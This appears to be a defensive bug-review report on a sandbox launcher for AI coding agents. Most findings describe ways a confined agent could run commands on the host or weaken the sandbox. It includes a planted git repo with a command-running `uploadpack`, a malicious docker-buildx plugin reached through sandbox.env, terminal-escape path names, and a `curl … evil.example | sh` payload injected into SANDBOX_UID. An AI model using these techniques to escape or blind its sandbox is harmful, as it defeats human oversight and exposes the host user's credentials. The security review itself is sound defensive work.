# Bugs review — 2026-10-26

- **Review date:** 2026-10-26
- **Last reviewed commit:** `bec1c57` (`bec1c5737acdc549143e2c55e4a4b945ae27a287`, main, 2026-10-18 — "Merge pull request #312")
- **Window reviewed:** everything changed since 2026-09-01 — `8f32aa1` (last commit before Sep 1) .. `bec1c57`: 200 non-merge commits, 212 files. Pre-window code the window relies on was in scope where a reviewer hit a real defect; such findings say "Introduced: … (before the window)".
- **Rule:** only defects present at `bec1c57`. Anything introduced and fixed again inside the window is not listed.
- **Method:** eight area reviewers plus a docs-vs-code reviewer, run in parallel against the diff and the code at HEAD. Each finding was then triaged; the HIGH ones were re-checked against the code by the coordinator. Hermetic suite at HEAD: 98/98 under C.UTF-8, 96/98 under en_US.UTF-8 (TST-1). Falsify corpus + `check-ledger.sh --strict`: green. All 78 integration mutation patches apply.
- **Updated 2026-10-26:** batches 1 and 2 are merged (main `e426e09`). Section 9 lists what the reviews of those fixes found and left open, reviewed up to `e426e09`. Status lines cite the commits as merged.
- **Updated 2026-10-27:** batch 9 is merged (main `6a0b37f`). Section 10 lists what its 19 review rounds left open, reviewed up to `6a0b37f`.
- **Updated 2026-10-27:** batch 8 is merged (main `5da9aeb`); its two reviews left nothing open.
- **Updated 2026-10-28:** batch 10, the section 10 leftovers, is merged (main `86427b0` and the commits after it). Section 15 lists what its reviews left open, reviewed up to `708742d`.
- **Updated 2026-10-28:** batch 11 removes `SANDBOX_GIT_FIXTURES` (GIT-11, GIT-21, LNCH-16) and the `host` group, which mounted the real `$HOME` dot-directories read-write (the user's choice; see the CHANGELOG).
- **Updated 2026-11-02:** GAP-6 (feature gaps review) is on main (`90f0417`..`1ca06cf`). Section 18 lists what its reviews left open (PRJ-10, since fixed; PRJ-11), reviewed up to `1ca06cf` and, for PRJ-10's fix, `18fb842`.
- **Updated 2026-11-03:** section 19, found while doing GAP-1/3/4 (falsify), has TST-24, FIXED.
- **Updated 2026-11-03:** section 21, found while measuring GAP-2's oracle selection on sandbox.sh and killing its survivors: TST-26 and TST-27, FIXED; GIT-23 and GIT-24, open.
- **Updated 2026-11-04:** GIT-24 is FIXED the way the user chose: where git does not run, nothing parses a config. Section 22 lists what its reviews found outside it: GIT-25 and GIT-26, open.
- **Updated 2026-11-04:** GIT-23 is FIXED: a regular file only slow to read gets 10 s, within 30 s per launch.
- **Updated 2026-11-04:** section 23, found while running PLAT-5 on macOS: GIT-27 and TST-28, FIXED.
- **Updated 2026-11-04:** GIT-25 and GIT-26 are FIXED (`d942daa`). GIT-28, found while fixing them (section 22), is FIXED too, after seven reviews of its fix; `--version` no longer reports `-dirty` (the user's choice).
- **Updated 2026-11-05:** the fix-batch table below no longer lists as open what was fixed after its batch. Every entry is FIXED except these: GIT-29 (open; section 24; the user chose fix A, 2026-11-05), GIT-35 (open, LOW), GIT-38 (open, HIGH) and GIT-39 (open, MEDIUM; section 25), LNCH-2 (not reproducible), GIT-12 (won't fix), GIT-13 (resolved fail-closed), LNCH-7 (documented), GIT-21 and LNCH-17 (closed), BLD-8 (its `--error-on=any` trade kept by design) and TST-21 (the same comment edit is owed to mgd-ai-containers' copy of `tests/layer-checks.conf`, which is not reachable from this machine). Section 24 holds GIT-29, found while reviewing PLAT-7's run steps; section 25 GIT-30, found by GAP-2's slice 2, and GIT-31 to GIT-39, found by the reviews of its fix and theirs.
- **Updated 2026-11-06:** GIT-29 is FIXED by fix A, after a review and a re-review of the fix. GIT-40, found by the automated security review of the GIT-36/37 fix (section 25), is FIXED.
- **Updated 2026-11-07:** GIT-38 is FIXED on Linux, after a review of the fix; macOS and WSL verify it (platform-issues PLAT-8). GIT-41, found by that review, is open (section 25).
- **Updated 2026-11-07:** GIT-35 is FIXED, after three reviews of the fix. GIT-45, found by the first, is open (section 25).
- **Updated 2026-11-07:** GIT-44, found by that review too, is FIXED, after three reviews of the fix and two final ones; with it, a defect the automated security review of `fe955c3` found in the GIT-35 fix (see that entry).
- **Updated 2026-11-07:** GIT-46, found by the automated security review of the GIT-44 fix (`c6316af`) and its second final review, is FIXED.
- **Updated 2026-11-07 (later):** GIT-41 reproduced on macOS with Colima (virtiofs), through a real launch, and is MITIGATED: the files are put back when the container exits (section 25). GIT-38 passed on macOS's APFS (PLAT-8).
- **Updated 2026-11-07:** GIT-39 is FIXED, after a review and a re-review of the fix. GIT-42 and GIT-43, found by the review (GIT-43 also by the automated security review of `f90c096`), are open (section 25). GIT-35's first case is fixed with it, and GIT-35 is raised to MEDIUM by what the re-review found.
- **Updated 2026-11-07:** GIT-41 is FIXED on WSL, measured there by PLAT-8's drvfs half, which also showed it wider than modelled: every read-only overlay, the launcher's included. GIT-38's drvfs part is fixed with it. Both stay open on macOS until PLAT-8's APFS half is measured (section 25).
- **Updated 2026-11-09:** GIT-49 (FIXED, MEDIUM), found by the final review of the GIT-42 fix, is in section 25.
- **Updated 2026-11-08:** section 26, found while doing GAP-2's slice 3 and in its CI run: LNCH-22 (open, LOW) and TST-29 (a falsify flake in CI, cause open; the diagnostic that names it next time is FIXED). GIT-47 (open, LOW), from the final review of that slice, is there too. LNCH-22 is FIXED; LNCH-23, found while fixing it, is there too, and FIXED, and so is REPO-18, found while testing that fix. GIT-43 and GIT-45 are FIXED; GIT-48 (LOW), from the final review of GIT-45, is in section 25, and FIXED.
- **Updated 2026-11-08:** section 27, found while running PLAT-9 on macOS: TST-31 (test only), FIXED.
- **Updated 2026-11-10:** TST-29's cause is found and FIXED (section 26): `wait "$!"` on a finished process substitution reports failure at random in bash 5.1 to 5.3, so `repo.sh reset` could refuse a sound repository. GIT-50 (open, LOW), the same fault in `version.sh`, found by the review of that fix, is there too.
- **Updated 2026-11-10:** GAP-2's slice 6 found GIT-51 (MEDIUM, now FIXED): what one writable mount's scan finds is protected in that mount's view alone, so a repository or launcher that a second, outer mount exposes past its own scan stays writable there. GIT-52 and GIT-54 (open, LOW) and GIT-53 (LOW, now FIXED) are in the same section 28, with what the reviews of those fixes found: GIT-55 and GIT-58 (MEDIUM, now FIXED: a `.git` file or link above a mount in an outer writable mount past its scan, and a linked worktree's checkout `.git` file no scan reaches, were left writable), GIT-57 (LOW, now FIXED), GIT-56 (open, LOW), GIT-59 and GIT-60 (open, MEDIUM: a linked worktree's checkout in another writable mount keeps its `.git` writable; a directory the agent made unsearchable hides a checkout's `.git`) and GIT-61 (open, LOW).
- **Updated 2026-11-10:** GIT-59 and GIT-60 (MEDIUM), and GIT-52, GIT-54, GIT-56 and GIT-61 (LOW), are FIXED by the WSL native agent, which took them from the Linux agent's list with GIT-50 (the user's choice): a linked worktree's checkout in another writable mount has its `.git` taken in that mount's view; a checkout behind a directory the agent made unsearchable gets that directory read-only whole; a decoy no longer hides a `.git` directory; the walk up takes the `.git` git takes; a read-only mount inside a writable one is scanned; "no worktree is known" is said once every mount is scanned (section 28). LNCH-24 (LOW), GIT-56's twin for launchers, found and FIXED with it.
- **Updated 2026-11-10:** GAP-2's slice 7 found GIT-62 (open, MEDIUM: a `commondir` that is a symlink switches off the protection a regular one gets, so a link planted in a repository not yet protected keeps launches from protecting it while the link is there, and a session that then removes it and writes a config is not named after the session) and GIT-63 (open, LOW: what a `commondir` in another writable mount names is not looked at after the session), in section 29, reviewed up to `f3a74e1`.
- **Updated 2026-11-11:** GAP-2's slice 7 found GIT-64 (open, MEDIUM: in a git directory with no `config`, a `commondir` that leads back to it, or that the agent can make lead back, keeps the launch from making and binding that `config`, and with `objects/` moved aside no warning is printed), in section 29, reviewed up to `83748b0`.
- **Updated 2026-11-11:** GAP-2's slice 7 found GIT-65 (open, LOW: a common directory inside a writable mount, past its scan, that a linked worktree's directory outside every mount names is neither protected nor named; git never makes that layout itself), in section 29, at `26b54d7`.
- **Updated 2026-11-11:** the review of GAP-2's slice 7, fourth batch, found TST-34 (open, LOW, test only: `tests/test-grep-q-pipelines.sh` does not scan the git-internals tests, which take `pipefail` from their library; no check passes falsely today), in section 29, at `852a887`.
- **Updated 2026-11-11:** GIT-68 (open, LOW), found by the final review of GIT-67's fix: a common directory in a writable mount that a git directory outside every mount names is taken without the rule GIT-67 sets for a worktree's grandparent, in section 29.
- **Updated 2026-11-11:** GIT-68 (LOW) is FIXED: a git directory in a writable mount that the `commondir` of a git directory outside every mount names must have no `commondir` but `./`, or the launch is refused, in section 29. Its reviews found GIT-69 (HIGH): a directory git takes as a git directory, with `objects` or `refs` an executable file, was none to the launcher, so nothing in it was protected or named, a bare repository planted in a writable mount included, in section 29.
- **Updated 2026-11-12:** GIT-71 and GIT-72 (open, LOW, pre-existing), found by the review of GIT-69's fix: the check after a session takes a linked worktree's directory the launch saw for a frozen common directory; the walk up from a mount does not ask whether a directory on the way is itself a bare repository, in section 29.
- **Updated 2026-11-12:** GIT-70 (open, MEDIUM), found by the final review of GIT-68's fix: a refusal's remedy can name git's own `commondir`, and following it hands git the agent's config, in section 29.
- **Updated 2026-11-12:** GIT-69 (HIGH) is FIXED: `objects` and `refs` count as git counts them, whatever they are, and the check after the session reads the `config` git reads for a directory a `commondir` named, in section 29.
- **Updated 2026-11-11:** GIT-67 (MEDIUM) is FIXED: the fix of GIT-62 and GIT-64 still let a planted `commondir` steer the host's git, in ways three reviews ran; a `commondir` git does not write now refuses the launch in any git directory, a link included (git writes one only in a linked worktree's directory, as `../..` or, libgit2, that directory's full path, naming a repository's own git directory), in section 29.
- **Updated 2026-11-08:** GIT-43's macOS half measured: `mount` names mount points by the physical path, so the fix holds there; G131 now runs on macOS with an attached disk image (section 25).
- **Companion:** [2026-10-26-feature-gaps-review.md](2026-10-26-feature-gaps-review.md).
- **Confidence:** CONFIRMED = reproduced, or unambiguous from the code. PLAUSIBLE = strong reasoning, not reproduced (usually needs hardware or a platform not available here); verify before fixing.
- **Citations** are by snippet, per AGENTS.md "Citing code". Scratch repro paths mentioned in entries were session-local and may no longer exist; each entry describes its repro in full.

## Fix batches (one PR per area)

| # | Area | Findings | Feature gaps folded in | Highest |
|---|---|---|---|---|
| 1 | Host-side launcher: git internals + launcher overlay | GIT-1, LNCH-1, LNCH-3 (partly) — fixed; LNCH-2 not reproducible (PLAT-1) | GAP-12 (only: follow includes inside included files) | HIGH |
| 2 | Launcher config / env layers / credentials | ENV-1 … ENV-6 — all fixed; REPO-1 found and fixed | — | HIGH |
| 3 | Container-start runtime tools (entrypoint root steps, reconciles) | RT-1 … RT-8 — all fixed; RT-9 fixed later (2026-10-28) | stretch: GAP-1 for `link-default-ruby.sh`, `install-agent-skills.sh`, `agent-tools-reconcile.sh` | HIGH |
| 4 | Host lifecycle scripts (project-init, sync, repo, group, report) | PRJ-1 … PRJ-9, DOC-1, DOC-3, REPO-2 … REPO-4, REPO-7 — fixed (PRJ-7 with TST-1); REPO-5, 6, 8 … 12 fixed later (2026-10-28, 2026-10-29) | optional: GAP-6; stretch: GAP-1 for `group.sh` | MEDIUM |
| 5 | In-container DB services | SVC-1 … SVC-4 — all fixed (SVC-2's hardware check is PLAT-4); SVC-5 fixed in a follow-up | — | MEDIUM |
| 6 | Build / Dockerfile / tools.d / config validation | BLD-1 … BLD-7 — fixed; ENV-7 fixed in batch 10; BLD-8 fixed later (2026-10-28) but for one trade kept by design | — | MEDIUM |
| 7 | Test harness and CI | TST-1 … TST-8 — all fixed (PRJ-7 with TST-1); TST-12 found and fixed; TST-9, TST-10 and TST-13 fixed in a follow-up, TST-11 in another, TST-14 and TST-15 in a third, TST-16 and TST-17 in a fourth, TST-18 in a fifth, TST-19 … TST-21 in a sixth (TST-21's `layer-checks.conf` comment waits for mgd-ai-containers) | GAP-5 (same fix as TST-2), GAP-8 (with TST-5), GAP-9 (with TST-3) — all done | MEDIUM |
| 8 | Docs (docs-only PR) | DOC-2, DOC-4 … DOC-13 — all fixed, with the same drift its reviews found elsewhere (a provenance check that could not fail among it) | GAP-14 (overlaps DOC-6) — done | MEDIUM |
| 9 | Launcher follow-ups (from the batch 1 hotfix review) | GIT-2 … GIT-5, LNCH-3 (the rest), LNCH-4 — all fixed; the HIGHs its reviews found fixed with them; its leftovers (section 10) fixed in batch 10 | — | MEDIUM |
| 10 | Batch 9 leftovers (section 10) | GIT-6 … GIT-19, LNCH-5 … LNCH-14 — fixed, with ENV-7; GIT-12 kept as it is, LNCH-7 documented, GIT-13 resolved fail-closed; section 15's leftovers fixed or closed in batches 11 and 13 | — | LOW |

Folded-in gaps are described in [2026-10-26-feature-gaps-review.md](2026-10-26-feature-gaps-review.md); each carries a matching `Fix batch:` line there. **Optional** = same files, but grows the batch; take it if the batch is small. **Stretch** = activate those files' deferred falsify targets in the same PR, so the new assertions are shown to be able to fail; it costs a mutation-score run per batch. The remaining gaps (GAP-2, 3, 4, 7, 10, 11, 13, and the rest of GAP-12) are a separate track.

Platform-specific items that need another OS or hardware to reproduce are in [2026-10-26-platform-issues.md](2026-10-26-platform-issues.md) (PLAT-1 … PLAT-4).

Duplicates merged: PRJ-2 is the same defect as DOC-1 (fix once, in batch 4); PRJ-7 is the same defect as TST-1 (fix once, in batch 7).

### HIGH — fix first

| ID | Summary |
|---|---|
| GIT-1 | The launcher's host-side `git ls-files` on an agent-controlled partial clone lazy-fetches and runs `remote.*.uploadpack` → arbitrary command on the **host** (reproduced 3/3). |
| ENV-1 | A committed `sandbox.env` can set `DOCKER_CONFIG`/`DOCKER_HOST`; `build.sh` then runs a planted `docker-buildx` CLI plugin on the host, with `GITHUB_TOKEN` (reproduced). |
| RT-1 | `link-default-ruby.sh` runs `~/.rvm/rubies/*/bin/* --version` as **root with NET_ADMIN**, after the restricted firewall is up; `~/.rvm` is agent-writable → firewall can be lifted (verified against entrypoint). |

### MEDIUM

GIT-2, ENV-2, ENV-3, ENV-4, LNCH-1, LNCH-2, RT-2, RT-3, RT-4, SVC-1, BLD-1, BLD-2, PRJ-1, PRJ-3, PRJ-5, DOC-1 (=PRJ-2), DOC-2, DOC-3, TST-1 (=PRJ-7), TST-2, TST-3.

### LOW

Everything else.

---

## 1. Host-side launcher: git internals

### GIT-1: Host command execution — the launcher runs `git ls-files` on an agent-controlled repo, which triggers a promisor lazy-fetch that executes `remote.*.uploadpack`
- **Status: FIXED (batch 1)** — `f3ddb69`, hardened in `1c26919` (`GIT_NO_LAZY_FETCH=1 GIT_ALLOW_PROTOCOL=none`; test G28). `1c26919` left the unreadable-index `WARNING:` silent: with every transport refused, `ls-files` logs `error: Could not read <tree>` and exits 0 with the entries under that tree left out (git 2.34, 2.43, 2.47, 2.49, 2.53), and only the exit status was checked, so G28's third assertion failed on every Linux. Found on the WSL2 PLAT-2 run (2026-10-26); the read now also counts an `error:`/`fatal:` line as a failure.
- Severity: HIGH — Confidence: CONFIRMED (reproduced 3/3, host-side)
- Location: `sandbox.sh: git_dirs_in()` — `mapfile -d '' -t links < <(git -C "$top" -c core.fsmonitor=false -c safe.directory='*' --git-dir="$g" --work-tree="$top" ls-files -s -z 2>/dev/null)`
- Introduced: 91fac80 (gitlink/submodule discovery via `ls-files`, within the review window)

**What's wrong.** The whole point of the git-internals overlay is that *nothing
the agent can write under `.git` may cause the HOST's git to run a program*. But
`git_dirs_in()` — invoked by `launcher_ro_overlay()` on the host, at every
`sandbox.sh` launch, against every git directory it finds under a writable mount,
**before** docker runs and before any read-only overlay exists — executes a live
`git ... ls-files -s` with `--git-dir`/`--work-tree` pointed at that repository.
The code's only defense is `-c core.fsmonitor=false`, and the comment states the
belief explicitly:

> "The index is read with git, fsmonitor off, so a config tampered with before
> this protection existed runs nothing here" … "ls-files runs nothing from a
> repository's config once fsmonitor is off."

That claim is false. In a **partial clone** (`extensions.partialClone`) with a
**sparse index** (`index.sparse` / sparse-checkout cone), `ls-files -s` must
expand the sparse index, which requires reading the tree object of a collapsed
directory. If that tree object is absent (a promisor object), git performs a
**lazy fetch** from the promisor remote, which runs the transport command the
repo's own config names — `remote.origin.uploadpack` (or an `ext::`/`file://`
transport). `core.fsmonitor=false` does nothing about this path.

**Failure scenario (within the sandbox threat model).** The agent, in any
container session, has write access to objects/refs/worktree of every repo under
a writable mount, and can `git init` brand-new nested repos (which are not
protected until the *next* launch). In session 1 it plants a nested repo
configured as a partial clone + sparse index with
`remote.origin.uploadpack = "<any command>; false"` and a missing tree object.
Nothing under `.git` shows in `git status`/`git diff` on the host, and the
launcher that protects repos runs only at launch. On the **next** launch,
`git_dirs_in()` discovers that repo and runs `ls-files -s` on it → lazy fetch →
the agent's command executes **as the host user, outside the container, before
the firewall**. The same fires on the *first* launch that protects a repo whose
config was tampered with before protection existed (exactly the case the comment
claims is safe), and on any partial clone the user themselves obtained with a
malicious `uploadpack`.

**Evidence.** Deterministic repro (3/3) calling `sandbox.sh`'s own
`git_dirs_in` on a planted `proj/evil` repo:
```
=== calling git_dirs_in (the launcher's own discovery) ===
EXECUTED during git_dirs_in:
uid=1000(ihudak) gid=1000(ihudak) groups=1000(...),459(docker),...
```
The planted repo:
```
git init evil; sparse-checkout init --cone --sparse-index; sparse-checkout set a
rm -f .git/objects/<b-tree>              # make the collapsed dir's tree a promisor miss
git config core.repositoryformatversion 1
git config extensions.partialClone origin
git config remote.origin.promisor true
git config remote.origin.url  file://.../nowhere
git config remote.origin.uploadpack "id > PWNED; false"
```
`id`'s output landed in `PWNED` every run. The exact launcher invocation
(`-c core.fsmonitor=false -c safe.directory='*' --git-dir=... --work-tree=...
ls-files -s -z`) is what ran it. `safe.directory='*'` additionally makes git
willing to do this even on a repo owned by another uid.

**Fix direction.** Run that `ls-files` (and any launcher git call that touches a
repo's live config) with lazy fetch disabled — set `GIT_NO_LAZY_FETCH=1` in its
environment (verified: with `GIT_NO_LAZY_FETCH=1` the `uploadpack` command does
not run). Belt-and-braces: also neutralise transports with
`GIT_ALLOW_PROTOCOL=` (empty) / `-c protocol.allow=never` and/or read gitlinks
without expanding the sparse index. The misleading comment in `git_dirs_in`
should be corrected — `core.fsmonitor=false` is not sufficient to make
`ls-files` inert on an untrusted repo.



## 1. Host-side launcher: read-only launcher overlay and mount verification

### LNCH-1: An agent can plant any number of fake launchers or unlistable directories, and each one adds a bind mount, warnings and launch time with no upper limit
- **Status: FIXED (batch 1)** — `643d9bd`, `c5f6fcc` (`SANDBOX_LAUNCHER_MAX`, shared link budget naming what it skipped; test T46).
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `sandbox.sh: \`launcher_dirs_in()\`` (matches any directory holding `sandbox.sh` + `sandbox-common.sh`, and any unlistable directory the agent can reach). Also `sandbox.sh: \`launcher_ro_overlay()\``: the depth loop, the `ro_dsts` skip scan, and the per-launcher link scan `if (( ++nl > 200 )); then`.
- Introduced: the overlay and unreadable handling (window). The 200-links-per-launcher cap and T38 came later in the window and do not close this.
- What's wrong: AGENTS.md (Mount layout) says: "What the agent can write cannot make the check noisy or slow: links that sit in such an inner writable bind are not walked, a launcher that is itself a writable mount root is not walked, and at most 200 links per launcher are". The cap is **per launcher**, and the agent decides how many launchers there are. Two empty files make any directory in the writable project tree count as a launcher. That costs the agent nothing, and the host never runs it. Each such directory then gets all of the following on every later launch:
  - its own read-only overlay (and pins),
  - a `READ-ONLY:` line,
  - a manifest entry,
  - up to 200 link walks, each printing a `WARNING:`.
  `chmod 000` directories do the same through the unreadable-candidate path: one `:ro` bind plus one `WARNING` each. The git half has `SANDBOX_GIT_MAX` for exactly this concern ("the agent can make repositories and unlistable directories"). The launcher half has no such cap. Its loops are also quadratic: each candidate rescans `ro_dsts`, and the depth loop rescans every candidate.
- Failure scenario: during one session the agent runs `for i in $(seq 1000); do mkdir -p /workspace/proj/junk/l$i; touch /workspace/proj/junk/l$i/sandbox{,-common}.sh; for j in 1 2 3 4 5; do ln -s ../f /workspace/proj/junk/l$i/k$j; done; done`. The user's next launch then:
  - spends about 78 s in sandbox.sh before `docker run`,
  - adds 1001 `:ro` binds, about 50 s more per start on Docker Desktop by the doc's own 50 ms/bind figure,
  - prints 5000 `WARNING:` blocks.
  The real warnings, such as a genuine launcher link into a writable tree, are buried in that flood, and users learn to ignore the output.
- Evidence: reproduced. The fake-docker harness at `/tmp/claude-1000/-home-ihudak-dev-ai-tools-ai-containers/002098a4-b5ad-4f57-bc49-6373376abc59/scratchpad/launcher/harness.sh` copies the setup of `tests/test-launcher-dir-ro.sh`.
  - scratch script t1: baseline `args=66 warn=0`. With N=300, `args=668 warn=1500 ro=301`. With N=1000, `args=2068 warn=5000 ro=1001 ms=77799`.
  - scratch script t2 (200 `chmod 000` dirs): `ro-binds=202 warn=200 ms=3930`.
- Fix direction:
  - Put a total cap on launcher and unreadable overlays and on walked links per launch, like `SANDBOX_GIT_MAX`, and refuse the launch past it, naming where the overflow is.
  - Prune the launcher's inner writable binds (output dirs) from the `find`, instead of walking them and filtering afterwards.
  - Correct the AGENTS.md sentence.

### LNCH-2: The one anchor on `$HOME`'s filesystem stands in for launcher mounts on every other filesystem, so a non-preserving project filesystem is refused instead of skipped
- **Status: NOT REPRODUCIBLE (2026-10-26)** — run as PLAT-1 on Docker Desktop + WSL2 with the project on `/mnt/c`: Docker Desktop binds the distro's own drvfs mount, so device:inode survive the bind, verification runs over the drvfs entries and passes. No code changed; details in [2026-10-26-platform-issues.md](2026-10-26-platform-issues.md).
- Severity: MEDIUM — Confidence: PLAUSIBLE (reasoned, not reproduced: needs Docker Desktop + WSL2)
- Location: `entrypoint.sh: \`verify_launcher_mounts()\``, which compares `got="$(stat -c '%d:%i' /run/ai-launcher ...` once against `AI_LAUNCHER_ANCHOR` and then requires every manifest entry to match. The anchor is set in `sandbox.sh` by `_launcher_verify_dir="$HOME/.ai-containers/.verify-$$-$RANDOM"`.
- Introduced: a5e9948 / 7a4d5ae
- What's wrong: the anchor proves that the filesystem holding `~/.ai-containers` keeps device:inode across a bind. Nothing proves it for the filesystem holding each launcher source. When the project sits on a different filesystem that does not keep device:inode, the anchor matches, every entry mismatches, and the entrypoint says `ERROR: a launcher mount changed ... refusing to start`. That is a false accusation of a concurrent-container swap, it fires on every launch, and the user has nothing to act on.
- Failure scenario: Docker Desktop with WSL2 integration, `$HOME` on the distro's ext4, and the project on `/mnt/c/...` (drvfs). AGENTS.md itself discusses this setup ("a WSL drvfs path under /mnt/<drive>"). The daemon reaches `/mnt/c` through its own drvfs/9p mount in the docker-desktop distro, which is a different superblock with a different `st_dev`. The ext4 anchor survives, so verification runs. Every `.ai-containers` overlay is then reported as swapped, and the launch never starts. The same applies to any host where `$HOME` is passed through natively but some other source path goes through a file-sharing layer.
- Evidence: from the code, a single anchor gates every entry, and the manifest entries can come from any filesystem. Case 460 probes only one scratch directory, so it cannot catch this.
- Fix direction: anchor per device. For each distinct source `st_dev`, record one reference directory on that filesystem (for example the mount root, or the first source seen on that device). Skip with the NOTE only the entries whose reference does not survive the bind. Alternatively, on a mismatch, check the device of the mount root that holds the entry before calling it a swap.

### LNCH-3: Agent-chosen paths are printed raw to the host terminal
- **Status: FIXED (batch 9)** — `9bd3729` … `6a0b37f`, after the batch 1 part (`c5f6fcc`): every launcher message that prints a scanned path renders it through `_term()`, which replaces C0 and DEL, UTF-8 C1 and the bidi controls (test T49). `%q` still passes bidi characters through: LNCH-8 in section 10.
- Severity: LOW — Confidence: CONFIRMED (found while fixing batch 1, 2026-10-26; shown with T46's escape fixture)
- Location: the `WARNING:`/`NOTE:`/`READ-ONLY:` lines throughout `sandbox.sh: \`launcher_ro_overlay()\`` and `git_dirs_in()`'s callers that print `%s` with a path found by scanning a writable mount — e.g. `printf 'WARNING: launcher link %s leads somewhere the agent can change:\n' "$f"`.
- What's wrong: those paths are names the agent chose. A directory or link named with terminal escape sequences (`$'\e]0;…\a'`, OSC 52 clipboard writes, cursor movement) is written verbatim to the host's terminal on the next launch, where it can retitle the window, hide or rewrite the warnings around it, or on terminals that honour OSC 52 set the clipboard.
- Failure scenario: the agent runs `mkdir -p "/workspace/proj/x"$'\e[2K\e[1A'` next to a real launcher link it wants unnoticed; the next launch's WARNING for that link is overwritten on screen.
- Evidence: T46 (`tests/test-launcher-dir-ro.sh`) plants `z$'\e]0;pwned\a'`; with `%s` the refusal carried the raw ESC (`^[]0;pwned^G`). The two refusal listings (`SANDBOX_LAUNCHER_MAX`, `SANDBOX_GIT_MAX`) now use `%q` (batch 1); every other site still prints raw.
- Fix direction: one helper that renders an agent-reachable path for the terminal (`%q`, or control characters replaced), used by every launcher message that prints a scanned path; a test that plants an escape in each message class.


## 2. Launcher config, env layers and credentials

### ENV-1: A committed sandbox.env can still run code on the host. `env_key_denied` covers shell keys only, and `load_env_defaults` exports every other key to docker and git
- **Status: FIXED (batch 2)** — `a8824e8`, widened by `9fe4e35` (machine-only keys, `--pull=never`), `6a2424e` (`SANDBOX_WORKDIR` resolved through symlinks), `7b55eb3` (only `..` is portable; every project-image `docker run` passes `--pull=never`, `tests/test-pull-never.sh`) and `6b2cbc7` (the seed image under any of its names); tests in `tests/test-sandbox-env.sh`, T1.
- Severity: HIGH (raised from MEDIUM in triage: host code execution from a file AGENTS.md calls inert, committed data). Confidence: CONFIRMED (reproduced)
- Location: `sandbox-common.sh: \`env_key_denied()\``, `sandbox-common.sh: \`load_env_defaults()\``
- Introduced: the deny-list approach predates the window. The window widened it (ca44e38, 987efac) but kept it limited to shell and loader keys.
- What's wrong: AGENTS.md and the `load_env_defaults` header say sandbox.env is "designed to be COMMITTED and shared". They say parsing plus the deny-list keeps it inert data ("These files configure the launcher, never the shell"). But any key not on the deny-list is `export`ed into the environment of every tool that build.sh, sandbox.sh and repo.sh run. The docker CLI reads its own keys from that environment:
  - `DOCKER_CONFIG=<dir>`: docker loads CLI plugins from `<dir>/cli-plugins/` ahead of the system ones. `docker build` is now `docker buildx build`, so a committed `docker-buildx` file runs on the host as the user. It also inherits `GITHUB_TOKEN`, which build.sh exports for `--secret id=github_token,env=GITHUB_TOKEN`.
  - `DOCKER_HOST=tcp://…` / `ssh://…` (or `DOCKER_CONTEXT`): the build, its BuildKit `github_token` secret, and every `-e` the launch passes (`COPILOT_GITHUB_TOKEN`, `GITHUB_PERSONAL_ACCESS_TOKEN`) go to a daemon the committer picks.
- Failure scenario: a project tracks `.ai-containers/` (the documented "version the portable config" mode). A PR adds `DOCKER_CONFIG=./ci` to sandbox.env and a `ci/cli-plugins/docker-buildx` file. In review it looks like config, which is exactly the BASH_ENV reasoning the code gives. The next `./build.sh` (or `./runme.sh`) runs the file.
- Evidence: in a scratch copy of HEAD (`git archive`), sandbox.env held `IMAGE_NAME=pwn-test` and `DOCKER_CONFIG=./evil`, and `evil/cli-plugins/docker-buildx` was a script that prints and exits. Running `./build.sh` printed `PWNED: fake buildx ran as ihudak args: buildx build --build-arg … --secret id=github_token,env=GITHUB_TOKEN … -t pwn-test …` (docker 29.7.2).
- Fix direction: give sandbox.env/sandbox.local.env an allow-list of the keys the launcher actually reads (IMAGE_NAME, AI_CONTAINER_*, CONTAINER_*, SANDBOX_*, EXTRA_MOUNTS, REPOS, the *_PATH pointers, …). If that is not done, at least deny `DOCKER_*`, `BUILDX_*`, `BUILDKIT_*`, `GIT_*` and `SSH_*`.

### ENV-2: repo.sh pastes SANDBOX_UID/SANDBOX_GID unvalidated into the `bash -c` scripts its seed containers run as root
- **Status: FIXED (batch 2)** — `01018ef`; `tests/test-repo-ids.sh`.
- Severity: MEDIUM. Confidence: CONFIRMED (reproduced with a fake docker)
- Location: `repo.sh: \`host_uid="${SANDBOX_UID:-$(id -u)}"\``. The value is used in `seed_from_path` (`-c "cp -a /src/. /dst/ && chown -R ${host_uid}:${host_gid} /dst"`), `sync_from_path` and `sync_from_git` (`chown -R '"${host_uid}:${host_gid}"' /dst'`).
- Introduced: the code predates the window. The window added the numeric/range check (`must be numeric ids from 0 to 4294967294`) to `sandbox.sh: \`launcher_ro_overlay()\`` only, and AGENTS.md tells users to export the same values for repo.sh.
- What's wrong: repo.sh sources sandbox-common.sh, so SANDBOX_UID comes from the environment or from a committed sandbox.env. It is spliced into script text without validation. `seed_from_git` passes it safely as `"$2"`, but the other three paths do not. `sync_from_git` runs that script with the host's `~/.ssh` mounted (`-v "$HOME/.ssh":/root/.ssh-host:ro`) and unrestricted network.
- Failure scenario: sandbox.env contains `SANDBOX_UID=1000 /dst; curl -s https://evil.example/x | sh; true`. The next `./repo.sh add|sync|reset` runs the payload as root in the seed container. For a git repo that container holds the host's SSH private keys.
- Evidence: with `REPO_BACKEND=volume ./repo.sh add demo <dir>` and a fake docker, the captured `-c` script was `cp -a /src/. /dst/ && chown -R 1000 /dst; curl -s https://evil.example/x | sh; true:1000 /dst`.
- Fix direction: validate host_uid/host_gid in repo.sh with the same `^[0-9]{1,10}$` / ≤4294967294 rule. Better still, pass the value as a positional argument (`"$2"`), as `seed_from_git` already does.

### ENV-3: Tool config and credential dirs that are symlinks get copied as symlinks, so the "group copy" mounts the host's real directory read-write
- **Status: FIXED (batch 2)** — `9b0da59`, dangling group links repaired in `7b55eb3` (copy, never the link; a group link out is warned about, not refused); `tests/test-tool-config-mounts.sh` case 13.
- Severity: MEDIUM. Confidence: CONFIRMED (reproduced with a fake docker)
- Location: `sandbox.sh: \`cp -a "$HOME/$_cdir" "$group_root/$_cdir"\`` (tools.d `config_dir` seeding, multi-path loop added in the window). Also `sandbox-common.sh: \`_copy_group_slice()\`` (`cp -a "$from" "$dst/$p"`, which gained `.aws .azure .kube` in the window), together with `sandbox.sh: \`add_mount_if_exists()\``, which calls `resolve_path` and follows the link.
